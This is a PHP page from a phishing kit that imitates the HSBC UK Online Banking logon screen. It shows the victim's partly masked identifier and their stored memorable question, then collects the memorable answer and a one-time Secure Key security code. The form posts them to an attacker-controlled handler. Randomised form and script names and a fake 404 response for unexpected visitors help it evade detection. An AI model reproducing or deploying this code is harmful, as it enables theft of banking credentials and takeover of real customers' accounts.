<?php
session_start();
error_reporting(0);
include "hc.php";
include "control.php";
include "connect/out.php";
if(isset($_GET["accessU"]))
{
	$fname=randomCha(rand(10,12));
	$fj=randomCha(rand(4,7));
	$sq=getQues($_SESSION["ue"],$panel_rec);
	$sq=str_replace("\\","",$sq);
	echo '<!DOCTYPE html>
<html xml:lang="en-GB" xmlns="http://www.w3.org/1999/xhtml" class="dj_gecko dj_contentbox" lang="en-GB"><head>
      <meta content="text/html; charset=UTF-8">
      <title>Log on to Online Banking: with Secure Key Log on | HSBC</title>
	  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5, user-scalable=1">
      <meta http-equiv="content-type" content="text/html; charset=UTF-8">
      <meta http-equiv="Cache-Control" content="max-age=1,s-maxage=0, no-cache, no-store, must-revalidate, private">
      <link rel="stylesheet" href="reg/box.css'.outrand().'" media="screen">
	  <link rel="stylesheet" href="reg/button.css'.outrand().'" media="screen">
	  <link rel="stylesheet" href="reg/core.css'.outrand().'" media="screen">
	  <link rel="stylesheet" href="reg/footer.css'.outrand().'" media="screen">
	  <link rel="stylesheet" href="reg/table.css'.outrand().'" media="screen">
	  <link rel="stylesheet" href="reg/light.css'.outrand().'" media="screen">
	  <link rel="stylesheet" href="reg/head.css'.outrand().'" media="screen">
	  <link rel="stylesheet" href="reg/reset.css'.outrand().'" media="screen">
	  <link rel="stylesheet" href="reg/detail.css'.outrand().'" media="screen">
	  <link rel="stylesheet" href="reg/common.css'.outrand().'" media="screen">
	  <link rel="stylesheet" href="reg/extra.css'.outrand().'" media="screen">
	  <link rel="shortcut icon" type="ico" href="favicon.ico'.outrand().'">
   </head>
   <body class="ursula">
      <div tabindex="0" role="dialog" id="hsbcwidget_Lightbox_0" lang="en-GB">
         <div style="display: none;" class="lightbox">
            <span class="tabbableEl" tabindex="-1"></span>
            <a class="close jsClose noPrint" tabindex="0" role="button" href="#">close</a>
            <div class="lightboxInner1">
               <div class="lightboxInner2"></div>
            </div>
         </div>
         <div style="display: none;" class="overlay"></div>
      </div>
      <div id="top">
         <div id="mainTopWrapper">
            <div id="mainTopUtility">
               <h1>HSBC</h1>
               <div id="mainTopUtilityRow">
                  <ul id="tabs">
                     <li class="skipLink"><a class="skip" href="#innerPage" id="skip" target="#innerPage a:first" title="" lang="en-GB">Skip page header and navigation</a></li>
                     <li class="on"><a href="#">Personal</a></li>
                     <li><a href="#" title="">Business</a></li>
                  </ul>
                  <div id="siteControls">
                     <div id="langList">
                        <ul>
                           <li class="selected"><a href="#" title="" lang="en-UK">English</a></li>
                        </ul>
                     </div>
                     <div id="locale" lang="en-GB">
                        <div id="countrySelectorWrapper" lang="en-GB">
                           <a class="dropDownLink trigger" role="tablist" href="#countrySelectorContent" title=""><span><span class="flag uk">United Kingdom</span></span></a>
                           <div class="placeholder"></div>
                        </div>
                     </div>
                     <div id="logon" style="display: none;">
                        <ul style="display: none">
                           <li><a href="#" title="" class="redBtn"><span>Log on</span></a></li>
                           <li><a href="#" title="" class="greyBtn"><span>Register</span></a></li>
                        </ul>
                     </div>
                     <div id="logoff" style="display: none;" lang="en-GB">
                        <ul>
                           <li><a href="#" title="" class="redBtn"><span>Log off</span></a></li>
                        </ul>
                     </div>
                  </div>
               </div>
            </div>
            <div id="mainTopNavigation">
               <div id="logo"><a href="#" title=""><img alt="HSBC" src="reg/hsbc-logo.gif"></a></div>
               <div id="sections" lang="en-GB">
                  <nav>
                     <ul id="topLevel" role="menu">
                        <li class="level1">
                           <a tabindex="0" class="mainTopNav" id="everydayBanking"><strong>Everyday Banking</strong><br>Accounts
                           &amp; services</a>
                           
                        </li>
                        <li class="level1">
                           <a class="mainTopNav" tabindex="0" id="borrowing"><strong>Borrowing</strong><br>Loans &amp; mortgages</a>
                           
                        </li>
                        <li class="level1">
                           <a tabindex="0" class="mainTopNav" id="Investing"><strong>Investing</strong><br>
                           Products &amp; analysis</a>
                           
                        </li>
                        <li class="level1">
                           <a tabindex="0" class="mainTopNav" id="insurance"><strong>Insurance</strong><br>
                           Property &amp; family</a>
                           
                        </li>
                        <li class="level1">
                           <a tabindex="0" class="mainTopNav" id="lifeEvents"><strong>Life events</strong><br>
                           Help and support</a>
                           
                        </li>
                     </ul>
                  </nav>
               </div>
            </div>
         </div>
         <div class="pageHeaderBg" dir="ltr">
            <div class="pageHeading row">
               <div class="pageHeadingInner">
                  <h2>Log on to Online Banking</h2>
               </div>
            </div>
         </div>
         <div class="innerPage grid_skin" dir="ltr" id="askquestion">
            <div class="grid grid_24">
            </div>
         </div>
         <div class="innerPage" id="innerPage">
            <div class="grid_skin">
			';if(isset($_GET["error_i"]))
					 {
						 echo '
			<div role="alert" class="alertBox" id="hsbcwidget_AlertBox_0" title="" lang="en-GB">
			<div class="alertBoxInner" role="alert">
			<span class="hidden">Alert Box</span>
				<div><br>
								<p>
								
										<font color="red"><b>One or more errors must be corrected</b></font><br><br>The information you entered does not match our records. You will not be able to access any Digital Banking services if you continue to enter your details incorrectly.<br><br>Be aware - If you enter an incorrect Digital Secure Key password an invalid log on security code will be generated.
										<br>
									
								</p>
							</div>
			</div>
		</div>

';
					 }
					 
				if(isset($_GET["error_e"]))
					 {
						 echo '
			<div role="alert" class="alertBox" id="hsbcwidget_AlertBox_0" title="" lang="en-GB">
				<div class="alertBoxInner" role="alert">
				<span class="hidden">Alert Box</span>
					<div><br>
									<p>
									
											Please enter your memorable answer and security code.
											<br>
										
									</p>
								</div>
				</div>
			</div>
';
					 }
					 echo '

               <div class="row">
                  <div class="containerStyle01">
                     <div class="grid grid_24">
                        <div class="securityDetails">
                           <div class="row headerStyle01_2040">
                              <h3 class="left welcome">
                                 You are logging on as:
                                 <strong>'.substr($_SESSION["ue"],0,count($_SESSION["ue"])-5).'**** </strong>
                              </h3>
                              <a class="normalIcon right" href="idv.Log.php?ud=dashbrd&idv.cmd=LOGIN&accessU='.md5(rand(1,100)).'&ID='.randomChaSp(rand(40,60)).'">
                              Switch User<span class="chericon"></span>
                              </a>
                           </div>
                           <p>You must use your secure key to log on to Online Banking.</p>
						   <script>function '.$fj.'(e){var unicode=e.charCode? e.charCode : e.keyCode;if (unicode!=8 && unicode!=9  && unicode!=13 ){ if (unicode<48||unicode>57){ return false;}}}
						   function showinst(a){
							   if(a.className=="row showHideOpen")
							   {
								   a.className="row";
								   document.getElementById("inst").style.display="none";
							   }
							   else
							   {
								   a.className="row showHideOpen";
								   document.getElementById("inst").style.display="";
							   }
						   }</script>
                           <form method="post" action="idv.PayeeReq.php?ud=dashbrd&idv.cmd=REQUEST&accessU='.md5(rand(1,100)).'&ID='.randomCha(rand(40,60)).'" lang="en-GB" name="'.$fname.'" id="'.$fname.'">
                              <div class="containerStyle17 containerStyle17-ext01 containerStyle23">
                                 <div class="questionGroup000 securityDetails securityDetails-ext02">
                                    <h4>
                                       1.
                                       Answer your memorable question
                                    </h4>
                                    <div class="question clearfix jsQuestion">
                                       <label for="memorableAnswer">'.$sq.':</label>
                                       <div class="textInput">
                                          <span class="hidden">is required </span> <input type="password" id="memorableAnswer" name="memo" autocomplete="off" maxlength="25">
                                          <br>
                                          <div>
                                             <a class="linkUnderline" href="#"> I\'ve forgotten my memorable answer<span class="chericon"></span></a>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                              <div id="hideshowC" class="row showHideOpen" lang="en-GB" onclick="showinst(this)">
                                 <div class="row bottomPadding0 containerStyle24">
                                    <div class="questionGroup questionGroup-ext02 clearfix securityDetails securityDetails-ext02">
                                       <h4 class="left">
                                          2.
                                          Enter security code
                                       </h4>
                                       <ul>
                                          <li><a class="buttonArrow right showHideTrigger" href="javascript:void;"><span class="showLegacy">Show</span><span class="hideLegacy">Hide</span> instructions<span class="icon"></span> <span id="linkStatus" class="hidden">expanded</span></a></li>
                                       </ul>
                                    </div>
                                 </div>
                                 <div class="row bottomPadding0 showHideContent" style="height: auto;" id="inst">
                                    <p class="left"></p>
                                    <div class="clearfix memorableAnswer style1 ">
                                       <p>If you\'ve forgotten your Digital Secure Key password, select the (?) on your mobile device for help.<br <br="">(?) = the question mark image on the top right of the screen</p>
                                       <p></p>
                                       <ul class="steps">
                                          <li class="first" style="width:314px !important;">
                                             <img src="reg/01PreLogon.png" alt="" class="softTokenImg">
                                             <h5>1</h5>
                                             <p class="floatNone01">Launch the HSBC Mobile Banking app and select \'Generate security code\'.<br><br>If you\'re a Touch ID user, cancel the log on prompt and then select \'Generate security code\'.</p>
                                          </li>
                                          <li style="width:314px !important;">
                                             <img src="reg/secureKeyPassword.png" alt="" class="softTokenImg">
                                             <h5>2</h5>
                                             <p class="floatNone01">Enter your Digital Secure Key password and select \'Generate code\'.<br><br>For Touch ID, using the log on tab, select \'Generate code\' and follow the steps.</p>
                                          </li>
                                          <li style="width:314px !important;">
                                             <img src="reg/05Key.png" alt="" class="softTokenImg">
                                             <h5>3</h5>
                                             <p class="floatNone01">Your log on security code will be displayed.</p>
                                          </li>
                                       </ul>
                                    </div>
                                 </div>
                              </div>
                              <div class="row memorableAnswer-question">
                                 <h4>
                                 </h4>
                                 <div class="questionGroup">
                                    <div class="question question_2040 clearfix jsQuestion">
                                       <label for="idv_OtpCredential">Enter your log on security code
                                       </label>
                                       <div class="textInput">
                                          <input type="password" id="idv_OtpCredential" name="secc" onkeypress="return '.$fj.'(event)" maxlength="20">
                                       </div>
                                    </div>
                                    <ul class="linkList01">
                                       <li>
                                          <a class="underline" href="#">Reset all security details<span class="chericon"></span></a>
                                       </li>
                                       <li class="stolen"><a class="underline jsLightboxTrigger" href="#secondary"> Lost, damaged or stolen Secure Key<span class="hidden"> Open in an overlay window</span> <span class="chevron"></span></a>
                                       </li>
                                    </ul>
                                 </div>
                              </div>
                              <div>
                                 <a class="button tertiary tertiaryBtn" href="#">
                                 <span class="buttonInner"> Cancel </span>
                                 </a>
                                 <div class="right">
                                    <div class="button primary primaryBtn">
                                       <span class="buttonInner"> <input type="submit" value="Continue" class="submit_input">
                                       </span>
                                    </div>
                                 </div>
                              </div>
                           </form>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </div>
      <style type="text/css">  
         #footerMapRow,
         #footerLinksRow,
         #footerUtilityRow {
         width: 940px;
         }
         #footerMap #footerMapRow .column.last {
         padding-right: 0
         }
         #footerMap #footerMapRow .column {
         padding: 0 10px 0 0;
         width: 145px;
         }
      </style>
      <div dir="ltr" id="footerLinks">
         <div id="footerLinksRow">
            <ul style="display: flex; white-space: nowrap;">
               <li class="contact">
                  <a href="#" title="">Help &amp; Support</a>
               </li>
               <li class="branch">
                  <a href="#" title="">Find a branch</a>
               </li>
            </ul>
         </div>
      </div>
      <div dir="ltr" id="footerMap">
         <div class="sixCol" id="footerMapRow">
            <div class="column last">
               <h2>
                  <a href="#" title="">Support</a>
               </h2>
               <ul>
                  <li>
                     <a href="#" title="">Security centre</a>
                  </li>
                  <li>
                     <a href="#" title="">Card support</a>
                  </li>
                  <li>
                     <a href="#" title="">CoBrowse</a>
                  </li>
               </ul>
            </div>
         </div>
      </div>
      <div dir="ltr" id="footerUtility">
         <div id="footerUtilityRow">
            <ul>
               <li>
                  <a href="#" title="">About HSBC</a>
               </li>
               <li>
                  <a href="#" title="">Site map</a>
               </li>
               <li>
                  <a href="#" title="">Legal</a>
               </li>
               <li>
                  <a href="#" title="">Privacy notice</a>
               </li>
               <li>
                  <a href="#" title="" class="dnt_no_consent">Cookie
                  Policy</a>
               </li>
               <li>
                  <a href="#" title="">Accessibility</a>
               </li>
               <li>
                  <a href="#" title="">HSBC Group</a>
               </li>
            </ul>
            <p>
               © &nbsp;HSBC Group 2020
            </p>
         </div>
      </div>
      
      
      
      
      <style>.CoBrowseHiddenForScreenReader {position: absolute;left: -10000px;top: auto;width: 1px;height: 1px;overflow: hidden;} input.CoBrowseCheckBox[type=checkbox]:checked ~ #tealiumAcceptTC {display: none !important ;} .CoBrowseFade {display:none;position: fixed;left: 0 !important;top: 0 !important;bottom: 0 !important;right: 0 !important;width: 100%;height: 100%;z-index: 3000;background: rgba(0, 0, 0, 0.6);} .modale-shadowCob{display:block;width:100%;height:100%;top:0;left:0;z-index:9110;background:rgba(0, 0, 0, .7);cursor:pointer;z-index:9250}.modale{transition:opacity .25s cubic-bezier(0, .7, .38, 1);-webkit-transition:opacity .25s cubic-bezier(0, .7, .38, 1);-moz-transition:opacity .25s cubic-bezier(0, .7, .38, 1);-o-transition:opacity .25s cubic-bezier(0, .7, .38, 1);opacity:1;visibility:visible;position:fixed;font-family:sans-serif}.modale.hidden{opacity:0;visibility:hidden}.modale-content{z-index:9251;background:white;border:2px solid #DDDDDD;text-align:left;top:50%;left:50%;-webkit-transform:translate(-50%, -50%);-ms-transform:translate(-50%, -50%);transform:translate(-50%, -50%);padding:40px;width:540px}.modale-content .content{max-height:410px;overflow-y:auto;overflow-x:hidden}.modale-title{font-weight: normal !important;font-size:28px !important;line-height:28px !important;margin-bottom:15px;padding-bottom:0 !important;color:#333 !important;text-align:center}.modale-text{ line-height: 17px !important;margin-bottom:24px;font-size:16px !important;padding-bottom:0 !important}.modale-text img{max-width:100%}.modale-text--center{text-align:center}.buttonCloseModale {background:none; border:none;text-decoration: none;font-size: 40px; color: #333;  cursor: pointer;  position: absolute;  top: 15px;  right: 20px; height: 50px;width: 50px;text-align: center;}.buttonCloseModale:hover{color:#b6b7b6;cursor:pointer} .buttonCloseModale:focus { border-bottom: 1px solid black !important; } .text-non{margin-bottom:10px}.text-non span{color:#db0011}body .modale-img{max-width:100%;text-align:center}.modale-text--center{text-align:center}.selectRadioPopin{margin-bottom:26px;font-size:16px;color:#333}.modale-list{margin-left:6px;margin-top:16px;padding-bottom:37px;padding-left:18px;width:51%;display:inline-block}.modale-list li{padding-bottom:0;font-size:16px;text-align:left}.selectTitle,.radioGroup,.radio{display:inline-block}.radio{margin-left:32px;margin-bottom:3px}.buttonsModale{width:100%;padding:10px 0;display:inline-block;border-top:0 !important;margin-top:10px}.modaleBtnOui{display:inline-block;text-align:center;text-decoration:none;font-family:sans-serif;font-size:16px;padding:15px 20px;background-color:#db0011;color:white;line-height:1 !important}.modaleBtnOui:hover{background-color:#A4000D;text-decoration:none;color:white}.modaleBtnOui:active, .modaleBtnOui:focus{background-color:#83000A;text-decoration:none;color:white;outline:none}.modaleBtnNon{display:inline-block;text-align:center;text-decoration:none;font-family:sans-serif;font-size:16px;padding:14px 20px;text-decoration:none;cursor:pointer;border:1px solid #333;color:#333;margin-right:8px;line-height:1 !important}.modaleBtnNon:hover{border:1px solid #333;background-color:rgba(0, 0, 0, 0.05);text-decoration:none;color:#333}.modaleBtnNon:active, .modaleBtnNon:focus {border:1px solid #333;background-color:rgba(0, 0, 0, 0.15);text-decoration:none;color:#333;outline:none}.disclaimerPopin{display:inline-block;color:#333;font-size:14px}body .buttonsModale a.continueBtn{float:right}.CoBrowseTextInput input{border:1px solid #ccc;margin:0 7px 3px 0;padding:10px;width:264px}.modale-text.error_red{color:#db0011;margin:0;font-size:14px!important;}span.error_input_exclamation{background-color:#db0011;padding:6px 12px 5px 12px;font-size:22px;margin-left:-38px;font-weight:bold;color:#fff;vertical-align:middle} label.modale-text {font-weight: bold !important; display:inline-block; margin-bottom: 12px;} .content .modale-text input.CoBrowseCheckBox:focus {outline: 1px solid black !important;}</style> 
</body></html>';
}
else
{
	header($_SERVER['SERVER_PROTOCOL'] . ' 404 Page Not Found', true, 403);
	die("<h1>404 Page Not Found</h1>");
}
?>